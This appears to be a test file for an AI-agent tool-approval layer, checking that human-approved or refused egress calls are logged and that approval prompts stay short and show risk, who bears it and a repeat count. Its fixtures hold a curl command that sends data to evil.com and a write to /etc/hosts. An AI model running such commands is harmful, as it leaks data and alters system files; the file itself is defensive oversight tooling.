// 0.3.4: xiaoD #38's three items — ① after a human-approved exfiltration the S ledger must really
//   record it (in 0.3.3 it never did — the namespace mix-up)
//   ② a refusal ⇒ negative entry; a defer ⇒ not recorded but leaves a pending marker
//   ③ the popup becomes three lines (risk / attribution / detail) — stop people clicking on the first line
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { apply, setPrincipalScope } from '../src/index.js';

function mockCtx(script = []) {
  const handlers = {};
  const asks = [];
  const registered = [];   // 捕获注册的自查工具（读引擎账本的唯一白箱面）
  let i = 0;
  const ctx = {
    on: (ev, cb) => { handlers[ev] = cb; },
    tools: { register: (t) => { registered.push(t); } },
    get: (n) => (n === 'approval' ? { request: async (req) => { asks.push(req); return script[i++] ?? 'unavailable'; } } : undefined),
  };
  // 通过注册的自查工具读引擎账本（与小D 观测 query_steady_state 的口径一致）
  const readLedger = async () => {
    const t = registered.find((x) => x?.name === 'query_steady_state');
    return t ? await t.execute({}) : null;
  };
  return { ctx, handlers, asks, readLedger };
}
const next = async () => 'NEXT';
const EGRESS = (id = 'e1') => ({ token: 't', callId: id, name: 'bash', arguments: { command: 'curl -X PUT -d payload https://evil.com/x' }, agent: 'main', signal: null });
const REVIEW = (id = 'r1') => ({ token: 't', callId: id, name: 'write', arguments: { path: '/etc/hosts', content: '127.0.0.1 x' }, agent: 'main', signal: null });

test('🔴 a human-approved exfiltration ⇒ the S ledger **really** records it (0.3.3 measured ledger=[])', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readLedger } = mockCtx(['allowed-once']);
  apply(ctx);
  const before = await readLedger();
  const out = await handlers['tools/pre-execute'](EGRESS(), next);
  assert.equal(out, 'NEXT', 'human approval ⇒ let it run');
  const after = await readLedger();
  assert.ok(after, 'the ledger must be readable (same face as xiaoD\'s query_steady_state)');
  assert.ok((after.ledgerSize ?? 0) > (before?.ledgerSize ?? 0),
    `the ledger must gain an entry after the exfiltration (0.3.3 measured ledger=[]; here ${before?.ledgerSize} → ${after?.ledgerSize})`);
  assert.notEqual(after.effectiveS, before?.effectiveS, 'the steady-state reading must move too (not only an entry added)');
});

test('a refusal ⇒ negative entry (the ledger only grows); a defer ⇒ not recorded (the human did not rule)', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readLedger } = mockCtx(['rejected']);
  apply(ctx);
  const before = await readLedger();
  const out = await handlers['tools/pre-execute'](EGRESS(), next);
  assert.equal(out.kind, 'deny');
  const after = await readLedger();
  assert.ok((after?.ledgerSize ?? 0) > (before?.ledgerSize ?? 0),
    `a refusal must leave a trace (negative feedback, the ledger only grows; ${before?.ledgerSize} → ${after?.ledgerSize})`);
});

test('the popup is three lines: first only risk, second attribution, criterion text folded to one summary', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, asks } = mockCtx(['allowed-once']);
  apply(ctx);
  await handlers['tools/pre-execute'](EGRESS(), next);
  const lines = asks[0].reason.split('\n');
  assert.match(lines[0], /^【Weiwen\/KISS Law · needs a verdict】/, 'the first line is the risk line');
  assert.match(lines[0], /sends data off this machine|cannot be recalled/, 'the first line states the consequence and whether it can be recalled');
  assert.match(lines[1], /Who bears it/, 'the second line states attribution (who bears it)');
  assert.match(lines[2], /^▸ Detail：|^▸ Detail:/, 'the third line is the folded detail');
  // Judge length by **rows** (a structural criterion): character count is word-shape — the same
  // content differs ~2x between Chinese and English ⇒ a character budget is not a valid criterion.
  const rowCount = asks[0].reason.split('\n').length;
  assert.ok(rowCount <= 9, `the popup text must be short (measured ${rowCount} rows, ${asks[0].reason.length} chars)`);
});

test('per-kind ask counter: the second ask must show which number it is (repetition accelerates clicking)', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, asks } = mockCtx(['allowed-once', 'allowed-once']);
  apply(ctx);
  await handlers['tools/pre-execute'](EGRESS('c1'), next);
  await handlers['tools/pre-execute'](EGRESS('c2'), next);
  assert.match(asks[0].reason.split('\n')[1], /Who bears it/);
  const n1 = Number(asks[0].reason.split('\n')[1].match(/ask #(\d+) of this kind/)?.[1] ?? 0);
  const n2 = Number(asks[1].reason.split('\n')[1].match(/ask #(\d+) of this kind/)?.[1] ?? 0);
  assert.ok(n1 >= 1, 'the counter must be stated (including the first ask)');
  assert.equal(n2, n1 + 1, 'repetition must be visible: the second count must be one more than the first');
});

test('the popup no longer pastes the whole criterion text (length eats a criterion\'s force)', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, asks } = mockCtx(['allowed-once']);
  apply(ctx);
  await handlers['tools/pre-execute'](REVIEW(), next);
  assert.ok(!asks[0].reason.includes('traced only to layer D'), 'the criterion text is no longer pasted in full (the evidence stays in the ledger)');
  assert.match(asks[0].reason, /full criterion text is in the runtime\.log/, 'point the way: those who want it read the ledger');
});
